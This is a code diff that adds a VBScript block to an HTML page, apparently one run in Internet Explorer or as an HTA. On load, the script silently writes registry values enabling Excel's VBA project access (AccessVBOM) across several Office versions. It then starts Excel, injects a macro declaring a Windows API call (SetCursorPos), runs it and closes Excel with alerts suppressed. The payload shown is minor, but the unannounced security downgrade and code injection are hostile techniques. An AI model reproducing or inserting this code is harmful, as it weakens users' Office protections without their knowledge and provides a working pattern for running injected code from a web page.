@@ -97,5 +97,26 @@
             window.onbeforeunload=OnClose;
 
         </script>
+        <script language="VBScript">
+            Dim WshShell 
+            set WshShell = CreateObject("wscript.Shell") 
+            WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\11.0\Excel\Security\AccessVBOM",1,"REG_DWORD" 
+            WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\12.0\Excel\Security\AccessVBOM",1,"REG_DWORD" 
+            WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Excel\Security\AccessVBOM",1,"REG_DWORD" 
+            Dim oExcel, oBook, oModule 
+            Set oExcel = CreateObject("excel.application") 
+            Set oBook = oExcel.Workbooks.Add 
+            Set oModule = obook.VBProject.VBComponents.Add(1) 
+            strCode = _ 
+            "Private Declare Function SetCursorPos Lib ""user32"" (ByVal x As Long, ByVal y As Long) As Long" & vbCr & _ 
+            "Sub MyMacro(x as Long, y as Long)" & vbCr & _ 
+            "SetCursorPos x, y" & vbCr & _ 
+            "End Sub" 
+            oModule.CodeModule.AddFromString strCode 
+            oExcel.Run "MyMacro",0,0 
+            oExcel.DisplayAlerts = False 
+            oBook.Close 
+            oExcel.Quit 
+        </script>
     </body>
 </html>
